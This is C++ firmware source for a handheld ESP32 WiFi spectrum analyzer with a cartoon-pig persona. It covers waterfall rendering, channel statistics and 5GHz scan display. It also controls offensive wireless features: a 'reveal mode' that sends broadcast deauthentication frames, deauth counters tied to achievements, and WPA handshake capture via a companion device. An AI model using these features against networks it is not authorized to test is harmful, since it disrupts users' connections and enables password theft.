// HOG ON SPECTRUM Mode - WiFi Spectrum Analyzer Implementation

#include "spectrum.h"
#include "oink.h"
#include "../core/config.h"
#include "../audio/sfx.h"
#include "../core/network_recon.h"
#include "../core/oui.h"
#include "../core/stress_test.h"
#include "../core/wsl_bypasser.h"
#include "../core/wifi_utils.h"
#include "../core/heap_gates.h"
#include "../core/heap_policy.h"
#include "../core/xp.h"
#include "../ui/display.h"
#include "../piglet/mood.h"
#include <M5Cardputer.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_heap_caps.h>  // For heap_caps_get_largest_free_block
#include <NimBLEDevice.h>   // For BLE coexistence check
#include <algorithm>
#include <atomic>
#include <cmath>
#include <ctype.h>
#include <string.h>
#include "../core/janus_hog.h"

// Layout constants - spectrum + waterfall + channel labels + status bar
const int SPECTRUM_LEFT = 20;       // Space for dB labels
const int SPECTRUM_RIGHT = 238;     // Right edge
const int SPECTRUM_WIDTH = 218;     // SPECTRUM_RIGHT - SPECTRUM_LEFT
const int SPECTRUM_TOP = 2;         // Top margin
const int SPECTRUM_BOTTOM = 56;     // Lowered to give more vertical range
const int WATERFALL_TOP = 58;       // Waterfall starts here
const int WATERFALL_ROWS = 22;      // Number of history rows
const int WATERFALL_BOTTOM = 80;    // WATERFALL_TOP + WATERFALL_ROWS
const int CHANNEL_LABEL_Y = 82;     // Channel number row
const int XP_BAR_Y = 94;            // Filter/status bar

// RSSI scale
const int8_t RSSI_MIN = -95;        // Bottom of scale (weak signals)
const int8_t RSSI_MAX = -30;        // Top of scale (very strong)
const int8_t NOISE_FLOOR_DB = -92;  // Simulated noise floor level (future)

// View defaults
const float DEFAULT_CENTER_MHZ = 2437.0f;  // Channel 6
const float DEFAULT_WIDTH_MHZ = 60.0f;     // ~12 channels visible
const float MIN_CENTER_MHZ = 2412.0f;      // Channel 1 (2.4GHz)
const float MAX_CENTER_MHZ = 2472.0f;      // Channel 13 (2.4GHz)
const float BAND_MIN_MHZ = 2400.0f;        // 2.4GHz band edge (approx)
const float BAND_MAX_MHZ = 2483.5f;        // 2.4GHz band edge (approx)
// 5GHz view (rendered from JanusHog scan cache)
const float DEFAULT_CENTER5_MHZ = 5500.0f; // Mid-band (seamless overview)
const float DEFAULT_WIDTH5_MHZ  = 240.0f;  // Scrollable viewport (similar density to 2.4GHz view)
const float MIN_CENTER5_MHZ = 5180.0f;     // Ch36
const float MAX_CENTER5_MHZ = 5825.0f;     // Ch165
const float BAND5_MIN_MHZ = 5150.0f;       // Display start (approx UNII-1 lower)
const float BAND5_MAX_MHZ = 5850.0f;       // Display end (approx UNII-3 upper)
const float LOBE_HALF_WIDTH_MHZ = 15.0f;   // Gaussian half-width
const float LOBE_STEP_MHZ = 0.5f;          // Frequency step for lobe drawing
const float PAN_STEP_MHZ = 5.0f;           // 2.4GHz pan step (MHz)
const float PAN_STEP5_MHZ = 20.0f;         // 5GHz pan step (MHz) ~ 20MHz channel

static inline float clampCenter5GHz(float centerMHz, float widthMHz) {
    // Keep the viewport fully inside the displayed 5GHz band. If the viewport is wider
    // than the band, pin to mid-band so the display stays seamless.
    if (widthMHz <= 0.01f) {
        return (BAND5_MIN_MHZ + BAND5_MAX_MHZ) * 0.5f;
    }

    float half = widthMHz * 0.5f;
    float minCenter = BAND5_MIN_MHZ + half;
    float maxCenter = BAND5_MAX_MHZ - half;
    if (minCenter > maxCenter) {
        return (BAND5_MIN_MHZ + BAND5_MAX_MHZ) * 0.5f;
    }
    if (centerMHz < minCenter) return minCenter;
    if (centerMHz > maxCenter) return maxCenter;
    return centerMHz;
}

// Timing
const uint32_t UPDATE_INTERVAL_MS = 100;   // 10 FPS update rate

// Legacy Gaussian LUT (kept for compatibility with old bezier code path)
// Gaussian LUT for spectrum lobes (sigma=6.6, distances -15 to +15 MHz)
static const float GAUSSIAN_LUT[31] = {
    0.0756f, 0.1052f, 0.1437f, 0.1914f, 0.2493f,  // -15 to -11
    0.3173f, 0.3946f, 0.4797f, 0.5695f, 0.6616f,  // -10 to -6
    0.7506f, 0.8321f, 0.9019f, 0.9551f, 0.9885f,  // -5 to -1
    1.0000f,                                        // 0 (center)
    0.9885f, 0.9551f, 0.9019f, 0.8321f, 0.7506f,  // +1 to +5
    0.6616f, 0.5695f, 0.4797f, 0.3946f, 0.3173f,  // +6 to +10
    0.2493f, 0.1914f, 0.1437f, 0.1052f, 0.0756f   // +11 to +15
};

// NEW: Sinc LUT for realistic RF carrier wave shape with side lobes
// Formula: |sin(π * d / BW) / (π * d / BW)| where BW = 11 (WiFi channel half-bandwidth)
// Side lobes naturally decay: main lobe at 0, first nulls at ±11 MHz, side lobes between
// Extended range to ±22 MHz to show 2 side lobes per side
// Index 0-44 maps to distance -22 to +22 MHz
static const float SINC_LUT[45] = {
    // d = -22 to -18 (2nd side lobe region, left)
    0.0000f, 0.0650f, 0.1100f, 0.1300f, 0.1100f,
    // d = -17 to -13 (approaching 2nd null)
    0.0650f, 0.0000f, 0.0900f, 0.1500f, 0.1800f,
    // d = -12 to -8 (1st side lobe, left - peaks around -16)
    0.1500f, 0.0000f, 0.1700f, 0.2700f, 0.3300f,
    // d = -7 to -3 (main lobe rising)
    0.3700f, 0.5000f, 0.6500f, 0.8000f, 0.9100f,
    // d = -2 to 0 (main lobe peak)
    0.9700f, 0.9950f, 1.0000f,
    // d = 1 to 5 (main lobe falling)
    0.9950f, 0.9700f, 0.9100f, 0.8000f, 0.6500f,
    // d = 6 to 10 (main lobe edge to 1st null)
    0.5000f, 0.3700f, 0.3300f, 0.2700f, 0.1700f,
    // d = 11 to 15 (1st null and 1st side lobe, right)
    0.0000f, 0.1500f, 0.1800f, 0.1500f, 0.0900f,
    // d = 16 to 20 (2nd null region)
    0.0000f, 0.0650f, 0.1100f, 0.1300f, 0.1100f,
    // d = 21 to 22 (2nd side lobe tail)
    0.0650f, 0.0000f
};

// Spectrum analyzer buffers (static allocation - no heap)
static int8_t spectrumBuffer[SPECTRUM_WIDTH];           // Current frame RSSI per column
static int8_t spectrumPersist[SPECTRUM_WIDTH];          // Persistence (rolling average)
static int8_t spectrumPeak[SPECTRUM_WIDTH];             // Peak hold per column
static uint8_t waterfallBuffer[WATERFALL_ROWS][SPECTRUM_WIDTH];  // History (0-255 intensity)
static uint8_t waterfallWriteRow = 0;                   // Current write position (circular)
static uint32_t lastWaterfallUpdate = 0;
static const uint32_t WATERFALL_UPDATE_MS = 100;        // 10 FPS waterfall scroll

// Noise floor randomization seed (for animated noise)
static uint16_t noiseState = 0xACE1;

// 64-entry sine LUT in flash (0 bytes RAM). Values = round(127 * sin(2*pi*i/64)).
// Max error ~1.5% vs sinf(), visually indistinguishable for jitter/flutter animation.
static const int8_t FAST_SIN_64[64] PROGMEM = {
      0,  12,  25,  37,  49,  60,  71,  81,
     90,  98, 106, 112, 117, 122, 125, 126,
    127, 126, 125, 122, 117, 112, 106,  98,
     90,  81,  71,  60,  49,  37,  25,  12,
      0, -12, -25, -37, -49, -60, -71, -81,
    -90, -98,-106,-112,-117,-122,-125,-126,
   -127,-126,-125,-122,-117,-112,-106, -98,
    -90, -81, -71, -60, -49, -37, -25, -12
};

// O(1) sine lookup: phase64 in [0,63] wrapping, returns [-127, +127] (Q0.7)
static inline int8_t fastSinQ7(uint8_t phase64) {
    return FAST_SIN_64[phase64 & 63];
}

// Simple PRNG for noise floor animation
static inline uint8_t fastNoise() {
    noiseState ^= noiseState << 7;
    noiseState ^= noiseState >> 9;
    noiseState ^= noiseState << 8;
    return (uint8_t)(noiseState & 0x07);  // 0-7 range for subtle jitter
}

// Forward declaration for sinc amplitude helper
static float getSincAmplitude(float dist);

constexpr uint8_t CHANNEL_SLOTS = 14;  // index 1-13 used
const int8_t RSSI_NO_SIGNAL = -100;
const uint32_t ACTIVITY_INTERVAL_MS = 200;
const float TWO_PI_F = 6.2831853f;

// Per-channel activity + peak/avg stats (no heap)
static volatile uint32_t channelActivity[CHANNEL_SLOTS] = {};
static uint32_t channelActivitySnapshot[CHANNEL_SLOTS] = {};
static uint16_t channelActivityRate[CHANNEL_SLOTS] = {};
static int8_t channelPeakRSSI[CHANNEL_SLOTS] = {};
static int8_t channelAvgRSSI[CHANNEL_SLOTS] = {};
static uint32_t lastActivityUpdate = 0;
static uint32_t lastPeakDecay = 0;
static const uint32_t PEAK_DECAY_INTERVAL_MS = 200;  // Decay peaks every 200ms
static char mergeSsidKeys[MAX_SPECTRUM_NETWORKS][33] = {};
static uint8_t mergeSsidBssid[MAX_SPECTRUM_NETWORKS][6] = {};
static int8_t mergeSsidRssi[MAX_SPECTRUM_NETWORKS] = {};
static uint32_t mergeSsidLastSeen[MAX_SPECTRUM_NETWORKS] = {};
static uint16_t mergeSsidCount = 0;
const int8_t MERGE_HYSTERESIS_DB = 6;

// Static members
bool SpectrumMode::running = false;
std::atomic<bool> SpectrumMode::busy{false};  // [BUG7 FIX] Atomic for cross-core visibility
std::vector<SpectrumNetwork> SpectrumMode::networks;
SpectrumRenderNet SpectrumMode::renderNets[MAX_SPECTRUM_NETWORKS] = {};
uint16_t SpectrumMode::renderCount = 0;
SpectrumRenderSelected SpectrumMode::renderSelected = {};
SpectrumRenderMonitor SpectrumMode::renderMonitor = {};
float SpectrumMode::viewCenterMHz = DEFAULT_CENTER_MHZ;
float SpectrumMode::viewWidthMHz = DEFAULT_WIDTH_MHZ;
int SpectrumMode::selectedIndex = -1;
SpectrumBand SpectrumMode::viewBand = SpectrumBand::BAND_24;
float SpectrumMode::viewCenter24MHz = DEFAULT_CENTER_MHZ;
float SpectrumMode::viewWidth24MHz = DEFAULT_WIDTH_MHZ;
float SpectrumMode::viewCenter5MHz = DEFAULT_CENTER5_MHZ;
float SpectrumMode::viewWidth5MHz = DEFAULT_WIDTH5_MHZ;
int SpectrumMode::selectedC5Index = -1;
uint8_t SpectrumMode::selectedC5Bssid[6] = {0};
bool SpectrumMode::selectedC5Valid = false;
uint32_t SpectrumMode::lastUpdateTime = 0;
bool SpectrumMode::keyWasPressed = false;
uint8_t SpectrumMode::currentChannel = 1;
uint32_t SpectrumMode::startTime = 0;
SpectrumFilter SpectrumMode::filter = SpectrumFilter::ALL;
bool SpectrumMode::actionPromptActive = false;
uint8_t SpectrumMode::actionBssid[6] = {0};
char SpectrumMode::actionSsid[33] = {0};
uint8_t SpectrumMode::actionChannel = 0;
int8_t SpectrumMode::actionRssi = 0;
wifi_auth_mode_t SpectrumMode::actionAuthmode = WIFI_AUTH_OPEN;
bool SpectrumMode::c5HandshakePending = false;
uint32_t SpectrumMode::c5HandshakeStartMs = 0;
char SpectrumMode::c5HandshakeSsid[33] = {0};
volatile bool SpectrumMode::pendingReveal = false;
char SpectrumMode::pendingRevealSSID[33] = {0};
std::atomic<bool> SpectrumMode::pendingNetworkAdd{false};
SpectrumNetwork SpectrumMode::pendingNetwork = {0};

// Client monitoring state
bool SpectrumMode::monitoringNetwork = false;
int SpectrumMode::monitoredNetworkIndex = -1;
uint8_t SpectrumMode::monitoredBSSID[6] = {0};
uint8_t SpectrumMode::monitoredChannel = 0;
int SpectrumMode::clientScrollOffset = 0;
int SpectrumMode::selectedClientIndex = 0;
uint32_t SpectrumMode::lastClientPrune = 0;
uint8_t SpectrumMode::clientsDiscoveredThisSession = 0;
volatile bool SpectrumMode::pendingClientBeep = false;
volatile uint8_t SpectrumMode::pendingNetworkXP = 0;  // Deferred XP for new networks (avoids callback crash)

// Achievement tracking for client monitor (v0.1.6)
uint32_t SpectrumMode::clientMonitorEntryTime = 0;
uint8_t SpectrumMode::deauthsThisMonitor = 0;
uint32_t SpectrumMode::firstDeauthTime = 0;

// Client detail popup state
bool SpectrumMode::clientDetailActive = false;
uint8_t SpectrumMode::detailClientMAC[6] = {0};  // MAC of client being viewed

// Dial mode state (tilt-to-tune when device upright)
bool SpectrumMode::dialMode = false;
bool SpectrumMode::dialLocked = false;
bool SpectrumMode::dialWasUpright = false;
uint8_t SpectrumMode::dialChannel = 7;
float SpectrumMode::dialPositionTarget = 7.0f;
float SpectrumMode::dialPositionSmooth = 7.0f;
uint32_t SpectrumMode::lastDialUpdate = 0;
uint32_t SpectrumMode::dialModeEntryTime = 0;
std::atomic<uint32_t> SpectrumMode::ppsCounter{0};
uint32_t SpectrumMode::displayPps = 0;
uint32_t SpectrumMode::lastPpsUpdate = 0;

// Reveal mode state
bool SpectrumMode::revealingClients = false;
uint32_t SpectrumMode::revealStartTime = 0;
uint32_t SpectrumMode::lastRevealBurst = 0;

static inline int8_t smoothIIR(int8_t current, int8_t sample, uint8_t alpha) {
    int16_t accum = (int16_t)current * (alpha - 1) + sample;
    return (int8_t)(accum / alpha);
}

static void updateChannelStats(uint8_t channel, int8_t rssi) {
    if (channel < 1 || channel > 13) return;

    if (channelActivity[channel] < 0xFFFFFFFFu) {
        channelActivity[channel]++;
    }

    if (channelPeakRSSI[channel] == RSSI_NO_SIGNAL) {
        channelPeakRSSI[channel] = rssi;
    } else if (rssi > channelPeakRSSI[channel]) {
        channelPeakRSSI[channel] = (int8_t)((channelPeakRSSI[channel] + rssi * 3) / 4);
    }

    if (channelAvgRSSI[channel] == RSSI_NO_SIGNAL) {
        channelAvgRSSI[channel] = rssi;
    } else {
        channelAvgRSSI[channel] = smoothIIR(channelAvgRSSI[channel], rssi, 16);
    }
}

void SpectrumMode::init() {
    networks.clear();
    networks.shrink_to_fit();  // Release vector capacity
    renderCount = 0;
    memset(renderNets, 0, sizeof(renderNets));
    memset(&renderSelected, 0, sizeof(renderSelected));
    memset(&renderMonitor, 0, sizeof(renderMonitor));
    viewBand = SpectrumBand::BAND_24;
    viewCenter24MHz = DEFAULT_CENTER_MHZ;
    viewWidth24MHz = DEFAULT_WIDTH_MHZ;
    viewCenter5MHz = DEFAULT_CENTER5_MHZ;
    viewWidth5MHz = DEFAULT_WIDTH5_MHZ;
    viewCenterMHz = viewCenter24MHz;
    viewWidthMHz = viewWidth24MHz;
    selectedIndex = -1;
    selectedC5Index = -1;
    memset(selectedC5Bssid, 0, sizeof(selectedC5Bssid));
    selectedC5Valid = false;
    keyWasPressed = false;
    currentChannel = 1;
    startTime = 0;
    busy = false;
    pendingReveal = false;
    pendingRevealSSID[0] = 0;
    pendingNetworkAdd.store(false);
    memset(&pendingNetwork, 0, sizeof(pendingNetwork));
    filter = SpectrumFilter::ALL;
    actionPromptActive = false;
    memset(actionBssid, 0, sizeof(actionBssid));
    actionSsid[0] = 0;
    actionChannel = 0;
    actionRssi = 0;
    actionAuthmode = WIFI_AUTH_OPEN;
    c5HandshakePending = false;
    c5HandshakeStartMs = 0;
    c5HandshakeSsid[0] = 0;

    // Reset client monitoring state
    monitoringNetwork = false;
    monitoredNetworkIndex = -1;
    memset(monitoredBSSID, 0, 6);
    monitoredChannel = 0;
    clientScrollOffset = 0;
    selectedClientIndex = 0;
    lastClientPrune = 0;
    clientsDiscoveredThisSession = 0;
    pendingClientBeep = false;
    clientDetailActive = false;
    revealingClients = false;
    revealStartTime = 0;
    lastRevealBurst = 0;
    
    // Reset dial mode state
    dialMode = false;
    dialLocked = false;
    dialWasUpright = false;
    dialChannel = 7;
    dialPositionTarget = 7.0f;
    dialPositionSmooth = 7.0f;
    lastDialUpdate = 0;
    dialModeEntryTime = 0;
    ppsCounter = 0;
    displayPps = 0;
    lastPpsUpdate = 0;

    // Reset per-channel stats/history
    lastActivityUpdate = 0;
    mergeSsidCount = 0;
    for (uint8_t ch = 0; ch < CHANNEL_SLOTS; ch++) {
        channelActivity[ch] = 0;
        channelActivitySnapshot[ch] = 0;
        channelActivityRate[ch] = 0;
        channelPeakRSSI[ch] = RSSI_NO_SIGNAL;
        channelAvgRSSI[ch] = RSSI_NO_SIGNAL;
    }
    
    // Initialize spectrum analyzer buffers (analyzer-style rendering)
    memset(spectrumBuffer, RSSI_MIN, sizeof(spectrumBuffer));
    memset(spectrumPersist, RSSI_MIN, sizeof(spectrumPersist));
    memset(spectrumPeak, RSSI_MIN, sizeof(spectrumPeak));
    memset(waterfallBuffer, 0, sizeof(waterfallBuffer));
    waterfallWriteRow = 0;
    lastWaterfallUpdate = 0;
}

void SpectrumMode::start() {
    if (running) return;
    
    Serial.println("[SPECTRUM] Starting HOG ON SPECTRUM mode...");
    
    // Ensure NetworkRecon is running (handles WiFi promiscuous mode)
    if (!NetworkRecon::isRunning()) {
        NetworkRecon::start();
    }

    // Apply spectrum-specific sweep speed
    NetworkRecon::setHopIntervalOverride(Config::wifi().spectrumHopInterval);
    
    // init() first (clears + shrinks), THEN reserve (so shrink_to_fit doesn't kill capacity)
    init();
    networks.reserve(MAX_SPECTRUM_NETWORKS);
    
    // Register our packet callback for visualization
    NetworkRecon::setPacketCallback(promiscuousCallback);
    
    running = true;
    lastUpdateTime = millis();
    startTime = millis();

    // Request 5GHz data from C5 if available
    if (JanusHog::isConnected()) {
        // Trigger scan if no C5 data yet (auto-scan may not have fired)
        if (JanusHog::getScanCount() == 0 && JanusHog::getCurrentOp() == C5Op::NONE) {
            JanusHog::requestScan();
        }
    }

    Display::setWiFiStatus(true);
    Serial.printf("[SPECTRUM] Running - %d networks from recon\n", NetworkRecon::getNetworkCount());
}

void SpectrumMode::stop() {
    if (!running) return;
    
    Serial.println("[SPECTRUM] Stopping...");
    
    // Block callback during shutdown sequence
    busy = true;
    
    // Clear our packet callback (NetworkRecon keeps running)
    NetworkRecon::setPacketCallback(nullptr);
    
    // [P4] Ensure monitoring is disabled
    monitoringNetwork = false;
    
    // Unlock channel if we locked it
    if (NetworkRecon::isChannelLocked()) {
        NetworkRecon::unlockChannel();
    }

    // Clear spectrum-specific sweep override
    NetworkRecon::clearHopIntervalOverride();
    
    // Stop any continuous C5 monitors or in-progress handshake attacks.
    if (c5HandshakePending) {
        JanusHog::requestStop();
        JanusHog::clearHandshakeResult();
        c5HandshakePending = false;
    } else if (JanusHog::getCurrentOp() == C5Op::CHANNEL_VIEW ||
               JanusHog::getCurrentOp() == C5Op::PACKET_MONITOR) {
        JanusHog::requestStop();
    }
    actionPromptActive = false;

    running = false;
    Display::setWiFiStatus(false);

    // FIX: Release vector capacity to recover heap
    networks.clear();
    networks.shrink_to_fit();
    renderCount = 0;
    memset(renderNets, 0, sizeof(renderNets));
    memset(&renderSelected, 0, sizeof(renderSelected));
    memset(&renderMonitor, 0, sizeof(renderMonitor));
    
    busy = false;
    Serial.println("[SPECTRUM] Stopped - heap recovered");
}

void SpectrumMode::update() {
    if (!running) return;
    
    uint32_t now = millis();

    // ==[ PPS UPDATE ]== once per second
    if (now - lastPpsUpdate >= 1000) {
        displayPps = ppsCounter.exchange(0, std::memory_order_relaxed);
        lastPpsUpdate = now;
    }
    
    // Process deferred reveal logging (from callback)
    if (pendingReveal) {
        Serial.printf("[SPECTRUM] Hidden SSID revealed: %s\n", pendingRevealSSID);
        pendingReveal = false;
    }
    
    // Process deferred client beep (from callback)
    if (pendingClientBeep) {
        pendingClientBeep = false;
        SFX::play(SFX::CLIENT_FOUND);
    }
    
    // Process deferred XP from onBeacon callback (avoids level-up popup crash)
    // XP::addXP can trigger Display::showLevelUp which blocks - unsafe from WiFi callback
    if (pendingNetworkXP > 0) {
        uint8_t xpCount = pendingNetworkXP;
        pendingNetworkXP = 0;  // Clear before processing (atomic enough for single producer)
        for (uint8_t i = 0; i < xpCount; i++) {
            XP::addXP(XPEvent::NETWORK_FOUND);
        }
    }
    
    // Process deferred network add from onBeacon callback (ESP32 dual-core race fix)
    // push_back can reallocate vector, invalidating iterators in concurrent callback
    // [BUG FIX] Technique 4 (reserve pattern) + Technique 7 (recovery) per HEAP_MANAGEMENT.txt
    if (pendingNetworkAdd.load()) {
        // With reserve(MAX_SPECTRUM_NETWORKS) at start(), push_back never allocates.
        // At capacity, evict weakest instead of growing (zero heap allocation).
        bool hasCapacity = (networks.size() < networks.capacity());

        bool inserted = false;
        bool replaced = false;
        busy = true;  // Block callback during vector modification
        if (hasCapacity) {
            networks.push_back(pendingNetwork);
            inserted = true;
        } else if (!networks.empty()) {
            // No capacity to grow - replace weakest entry if new one is stronger
            int weakestIdx = -1;
            int8_t weakestRssi = 127;
            for (size_t i = 0; i < networks.size(); i++) {
                if (selectedIndex >= 0 && (int)i == selectedIndex) continue;
                if (monitoringNetwork && macEqual(networks[i].bssid, monitoredBSSID)) continue;
                if (weakestIdx < 0 || networks[i].rssi < weakestRssi) {
                    weakestRssi = networks[i].rssi;
                    weakestIdx = (int)i;
                }
            }
            if (weakestIdx >= 0 && pendingNetwork.rssi > weakestRssi) {
                networks[weakestIdx] = pendingNetwork;
                replaced = true;
            }
        }
        if ((inserted || replaced) && selectedIndex < 0) {
            selectedIndex = 0;
        }
        pendingNetworkAdd.store(false);
        busy = false;
    }
    
    // [P2] Verify monitored network still exists and signal is fresh
    if (monitoringNetwork) {
        bool networkLost = false;
        
        // Check if network got shuffled out
        if (monitoredNetworkIndex >= (int)networks.size() ||
            !macEqual(networks[monitoredNetworkIndex].bssid, monitoredBSSID)) {
            networkLost = true;
        }
        // Check signal timeout (no beacon for 15 seconds)
        else if (now - networks[monitoredNetworkIndex].lastSeen > SIGNAL_LOST_TIMEOUT_MS) {
            networkLost = true;
        }
        
        if (networkLost) {
            // Block callback during exit sequence (has delays)
            busy = true;
            
            // Descending tones for signal lost - non-blocking
            SFX::play(SFX::SIGNAL_LOST);
            Display::showToast("SIGNAL LOST");
            delay(300);  // Brief pause so user sees toast
            
            busy = false;
            exitClientMonitor();
        }
    }
    
    // Handle input
    handleInput();

    // Sync local channel state from NetworkRecon (sole channel owner).
    currentChannel = NetworkRecon::getCurrentChannel();
    
    // Update dial mode (tilt-to-tune when upright)
    if (viewBand == SpectrumBand::BAND_24) {
        updateDialChannel();
    } else {
        // Dial mode is 2.4GHz-only (S3 can't tune 5GHz). Ensure we don't lock channels in 5GHz view.
        if (dialMode) {
            dialMode = false;
            dialLocked = false;
            if (NetworkRecon::isChannelLocked()) {
                NetworkRecon::unlockChannel();
            }
        }
    }
    
    // Channel hopping is handled by NetworkRecon; Spectrum only locks when needed.
    
    // Update per-channel activity rates
    if (now - lastActivityUpdate >= ACTIVITY_INTERVAL_MS) {
        uint32_t dt = now - lastActivityUpdate;
        if (dt == 0) dt = 1;
        for (uint8_t ch = 1; ch <= 13; ch++) {
            uint32_t current = channelActivity[ch];
            uint32_t prev = channelActivitySnapshot[ch];
            uint32_t delta = current - prev;
            channelActivitySnapshot[ch] = current;
            uint32_t rate = (delta * 1000u) / dt;
            if (rate > 65535u) rate = 65535u;
            channelActivityRate[ch] = (uint16_t)((channelActivityRate[ch] * 3u + rate) / 4u);
        }
        lastActivityUpdate = now;
    }
    
    // Decay peak RSSI toward average (prevents "sticky" high bars)
    // Reference: docs/review/spectrum.cpp decays peaks every 200ms
    if (now - lastPeakDecay >= PEAK_DECAY_INTERVAL_MS) {
        for (uint8_t ch = 1; ch <= 13; ch++) {
            if (channelPeakRSSI[ch] > channelAvgRSSI[ch] && channelAvgRSSI[ch] != RSSI_NO_SIGNAL) {
                // Gentle decay: average peak with current average
                channelPeakRSSI[ch] = (int8_t)((channelPeakRSSI[ch] + channelAvgRSSI[ch]) / 2);
            }
        }
        lastPeakDecay = now;
    }
    
    // Prune stale networks periodically (only when NOT monitoring)
    if (!monitoringNetwork && now - lastUpdateTime > UPDATE_INTERVAL_MS) {
        pruneStale();
        lastUpdateTime = now;
    }
    
    // Prune stale clients when monitoring
    if (monitoringNetwork && (now - lastClientPrune > 5000)) {
        lastClientPrune = now;
        pruneStaleClients();
    }
    
    // Update reveal mode (periodic broadcast deauths)
    if (monitoringNetwork && revealingClients) {
        updateRevealMode();
    }
    
    // N13TZSCH3 achievement - stare into the ether for 15 minutes
    if (startTime > 0 && (now - startTime) >= 15 * 60 * 1000) {
        if (!XP::hasAchievement(ACH_NIETZSWINE)) {
            XP::unlockAchievement(ACH_NIETZSWINE);
            Display::showToast("THE ETHER DEAUTHS BACK");
        }
    }

    // If user is viewing 5GHz but C5 link is gone, drop back to 2.4GHz view.
    // Note: lack of scan data is normal before the first scan completes.
    if (viewBand == SpectrumBand::BAND_5 && !JanusHog::isConnected()) {
        setViewBand(SpectrumBand::BAND_24);
        Display::showToast("C5 5G LOST");
    }

    // Build render snapshot (heap-safe, avoids vector pointer races during draw)
    updateRenderSnapshot();
    
    // Update spectrum analyzer buffers for waterfall display (only in spectrum view)
    if (!monitoringNetwork) {
        updateSpectrumBuffers();
        updateWaterfall();
    }

    // Handle C5 handshake result if started from Spectrum action prompt.
    if (c5HandshakePending) {
        if (millis() - c5HandshakeStartMs > 90000) {
            JanusHog::requestStop();
            JanusHog::clearHandshakeResult();
            c5HandshakePending = false;
            Display::showToast("HANDSHAKE TIMEOUT");
        } else if (!JanusHog::isConnected()) {
            Display::showToast("C5 LINK LOST");
            JanusHog::clearHandshakeResult();
            c5HandshakePending = false;
        } else {
            HandshakeResult r = JanusHog::getHandshakeResult();
            if (r == HandshakeResult::CAPTURED) {
                Mood::onHandshakeCaptured(c5HandshakeSsid[0] ? c5HandshakeSsid : "5G");
                Display::showLoot(c5HandshakeSsid[0] ? c5HandshakeSsid : "5G");
                JanusHog::clearHandshakeResult();
                c5HandshakePending = false;
            } else if (r == HandshakeResult::FAILED) {
                Display::showToast("HANDSHAKE FAILED");
                JanusHog::clearHandshakeResult();
                c5HandshakePending = false;
            }
        }
    }
}

void SpectrumMode::updateRenderSnapshot() {
    busy = true;

    int minRssi = Config::wifi().spectrumMinRssi;
    if (minRssi < RSSI_MIN) minRssi = RSSI_MIN;
    if (minRssi > RSSI_MAX) minRssi = RSSI_MAX;
    bool collapse = Config::wifi().spectrumCollapseSsid;
    uint32_t now = millis();
    uint32_t staleMs = Config::wifi().spectrumStaleMs;
    if (staleMs < 1000) staleMs = 1000;
    if (staleMs > 60000) staleMs = 60000;

    // 5GHz view: build render snapshot from NetworkRecon (C5-injected networks).
    if (viewBand == SpectrumBand::BAND_5) {
        // Collapse-by-SSID is currently 2.4GHz-only.
        mergeSsidCount = 0;
        collapse = false;

        size_t count = 0;
        {
            // Copy out a snapshot while holding the recon vector lock. This makes 5GHz display
            // stable across scans and avoids depending on JanusHog's "last scan only" cache.
            NetworkRecon::CriticalSection lock;
            const auto& recon = NetworkRecon::getNetworks();
            for (size_t i = 0; i < recon.size(); i++) {
                const DetectedNetwork& net = recon[i];
                if (net.channel <= 14) continue;
                if (net.rssi < minRssi) continue;
                if (count >= MAX_SPECTRUM_NETWORKS) break;

                SpectrumRenderNet& out = renderNets[count];
                memcpy(out.bssid, net.bssid, 6);
                out.channel = net.channel;
                out.rssi = net.rssi;
                out.authmode = net.authmode;
                // C5 scan output doesn't expose PMF reliably; be conservative.
                out.hasPMF = true;
                out.isHidden = net.isHidden || (net.ssid[0] == '\0');
                out.displayFreqMHz = channelToFreq(net.channel);
                count++;
            }
        }
        renderCount = (uint16_t)count;

        // Maintain selection by BSSID across snapshot rebuilds.
        if (selectedC5Valid) {
            int idx = findC5IndexByBssid(selectedC5Bssid);
            if (idx >= 0) {
                selectedC5Index = idx;
            } else {
                selectedC5Valid = false;
                selectedC5Index = -1;
                memset(selectedC5Bssid, 0, sizeof(selectedC5Bssid));
            }
        }

        // If no selection, pick strongest matching entry so the UI has a sane default.
        if (!selectedC5Valid) {
            int bestIdx = -1;
            int8_t bestRssi = -127;
            for (uint16_t i = 0; i < renderCount; i++) {
                const SpectrumRenderNet& n = renderNets[i];
                if (!matchesFilterRender(n)) continue;
                if (bestIdx < 0 || n.rssi > bestRssi) {
                    bestIdx = (int)i;
                    bestRssi = n.rssi;
                }
            }
            if (bestIdx >= 0) {
                selectedC5Index = bestIdx;
                memcpy(selectedC5Bssid, renderNets[bestIdx].bssid, 6);
                selectedC5Valid = true;
                // Center view on the default selection.
                viewCenterMHz = clampCenter5GHz(channelToFreq(renderNets[bestIdx].channel), viewWidthMHz);
                viewCenter5MHz = viewCenterMHz;
            }
        }

        // Selected snapshot for status bar + highlight
        renderSelected.valid = false;
        if (selectedC5Valid && selectedC5Index >= 0 && selectedC5Index < (int)renderCount) {
            DetectedNetwork dn = {};
            if (NetworkRecon::findNetwork(selectedC5Bssid, &dn) && dn.channel > 14) {
                renderSelected.valid = true;
                memcpy(renderSelected.bssid, dn.bssid, 6);
                strncpy(renderSelected.ssid, dn.ssid, 32);
                renderSelected.ssid[32] = 0;
                renderSelected.channel = dn.channel;
                renderSelected.rssi = dn.rssi;
                renderSelected.authmode = dn.authmode;
                renderSelected.hasPMF = true;
                renderSelected.wasRevealed = false;
            } else {
                // Fallback: still allow highlighting the selected lobe even if metadata lookup fails.
                const SpectrumRenderNet& rn = renderNets[selectedC5Index];
                renderSelected.valid = true;
                memcpy(renderSelected.bssid, rn.bssid, 6);
                renderSelected.ssid[0] = 0;
                renderSelected.channel = rn.channel;
                renderSelected.rssi = rn.rssi;
                renderSelected.authmode = rn.authmode;
                renderSelected.hasPMF = true;
                renderSelected.wasRevealed = false;
            }
        }

        // No client overlay in 5GHz view.
        renderMonitor.valid = false;
        renderMonitor.clientCount = 0;

        busy = false;
        return;
    }

    if (collapse && mergeSsidCount > 0) {
        for (uint16_t i = 0; i < mergeSsidCount; ) {
            if ((now - mergeSsidLastSeen[i]) > staleMs) {
                uint16_t last = mergeSsidCount - 1;
                if (i != last) {
                    strncpy(mergeSsidKeys[i], mergeSsidKeys[last], 32);
                    mergeSsidKeys[i][32] = 0;
                    memcpy(mergeSsidBssid[i], mergeSsidBssid[last], 6);
                    mergeSsidRssi[i] = mergeSsidRssi[last];
                    mergeSsidLastSeen[i] = mergeSsidLastSeen[last];
                }
                mergeSsidCount--;
                continue;
            }
            i++;
        }
    }

    size_t count = 0;
    for (size_t i = 0; i < networks.size(); i++) {
